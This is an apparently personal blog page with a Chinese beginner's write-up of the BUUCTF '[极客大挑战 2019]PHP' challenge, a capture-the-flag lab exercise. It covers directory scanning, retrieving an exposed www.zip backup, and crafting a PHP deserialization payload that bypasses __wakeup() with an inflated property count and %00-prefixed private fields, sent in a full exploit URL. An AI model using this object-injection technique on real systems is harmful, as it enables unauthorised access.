@@ -1,0 +1,347 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>BUUCTF[极客大挑战 2019]PHP | tcktbar13122&#39;s blog</title>
+  <meta name="author" content="tcktbar13122">
+  
+  <meta name="description" content="最近在做BUUCTF上的题，虽然很老了但是因为是新手所以偶尔遇到不太细节的Writeup还是会想自己写一份。
+点开题目，会发现一只会跟着鼠标动的猫猫。
+
+查看页面源代码及BurpSuite拦截均未发现异常，那只好来扫一下目录了！
+首先使用dirsearch
+python3 dirsearch.py -u http://eaa995f8-86f5-4e8c-a252-b6d8bf44649d.node5.buuoj.cn:81/
+
+
+没有找到一个200…换dirmap试试。
+python3 dirmap.py -i http://eaa995f8-86f5-4e8c-a252-b6d8bf44649d.node5.buuoj.cn:81/ -lcf"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="BUUCTF[极客大挑战 2019]PHP"/>
+  <meta property="og:site_name" content="tcktbar13122&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="tcktbar13122&#39;s blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">tcktbar13122&#39;s blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> BUUCTF[极客大挑战 2019]PHP</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>最近在做BUUCTF上的题，虽然很老了但是因为是新手所以偶尔遇到不太细节的Writeup还是会想自己写一份。</p>
+<p>点开题目，会发现一只会跟着鼠标动的猫猫。</p>
+<p><img src="/2025/05/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1.png"></p>
+<p>查看页面源代码及BurpSuite拦截均未发现异常，那只好来扫一下目录了！</p>
+<p>首先使用dirsearch</p>
+<pre><code>python3 dirsearch.py -u http://eaa995f8-86f5-4e8c-a252-b6d8bf44649d.node5.buuoj.cn:81/
+</code></pre>
+<p><img src="/2025/05/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/2.png"></p>
+<p>没有找到一个200…换dirmap试试。</p>
+<pre><code>python3 dirmap.py -i http://eaa995f8-86f5-4e8c-a252-b6d8bf44649d.node5.buuoj.cn:81/ -lcf
+</code></pre>
+<p><img src="/2025/05/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/3.png"></p>
+<p>找到<a href="http://www.zip，这一定就是题目里说的备份文件吧，访问一下看看。在url后面添加文件名：">www.zip，这一定就是题目里说的备份文件吧，访问一下看看。在url后面添加文件名：</a></p>
+<pre><code>http://84776cc0-e25d-4fa2-9322-eee0da67049d.node5.buuoj.cn:81/www.zip
+</code></pre>
+<p>居然直接下载下来了，打开发现里面有这样几个文件：</p>
+<p><img src="/2025/05/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/4.png"></p>
+<p>打开flag.php看看，发现不是正经flag。</p>
+<p>看看剩下几个吧，先来看看index.php</p>
+<p><img src="/2025/05/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/5.png"></p>
+<p>发现这样一段PHP代码，引入了class.php，并且从 URL 的查询参数中获取名为 select 的值，赋值给变量 $select，最后进行了反序列化。</p>
+<p>那继续来看看class.php：</p>
+<p><img src="/2025/05/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/6.png"></p>
+<p>可以发现当username &#x3D; ‘admin’, password &#x3D; 100时，调用__destruct()可以得到flag。</p>
+<p>那么我们考虑手动满足这一条件。php代码如下：</p>
+<pre><code>&lt;?php
+
+class Name&#123;
+    private $username = &#39;nonono&#39;;
+    private $password = &#39;yesyes&#39;;
+
+    public function __construct($username,$password)&#123;
+        $this-&gt;username = $username;
+        $this-&gt;password = $password;
+    &#125;
+&#125;
+
+$a = new Name(&#39;admin&#39;, 100);
+var_dump(serialize($a));
+
+?&gt;
+</code></pre>
+<p>运行结果（序列化后的字符串）如下：</p>
+<pre><code>&quot;O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;&quot;
+</code></pre>
+<p>（P.S.看别人的Writeup的时候发现了php在线运行工具这样一个好用的东西，推荐）</p>
+<p>可以注意到class Name中还有一个wakeup()方法，这个方法会把我们的username重新赋值为’guest’，需要考虑如何绕过</p>
+<p>正常来说在反序列化过程中，会先调用wakeup()方法再进行unserilize()，但如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，wakeup()的执行会被跳过。（参考：<a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">PHP反序列化中wakeup()绕过总结</a>）</p>
+<p>(对于序列化与反序列化不熟悉的可以看一下这个帖子：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/kengwang/p/17842320.html">[CTF&#x2F;Web] PHP 反序列化学习笔记</a>)</p>
+<p>于是将字符串更改为这样：</p>
+<pre><code>&quot;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;&quot;
+</code></pre>
+<p>然后由于声明变量时使用的是private，而私有字段的字段名在序列化时，字段名前面会加上<code>\0（即%00）</code>的前缀</p>
+<p>所以最终的payload是这样的：</p>
+<pre><code>&quot;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;&quot;
+</code></pre>
+<p>塞进URL中是这样：</p>
+<pre><code>http://3f140ebb-8705-4836-9dab-70e3e5cd904f.node5.buuoj.cn:81/?select=O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;
+</code></pre>
+<p>拿到flag</p>
+<p><img src="/2025/05/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/7.png"></p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2025/05/01/Hexo插入本地图片不显示问题/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2025/02/14/一个测试/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2025-05-01 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/BUUCTF-Web/">BUUCTF Web<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 tcktbar13122's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
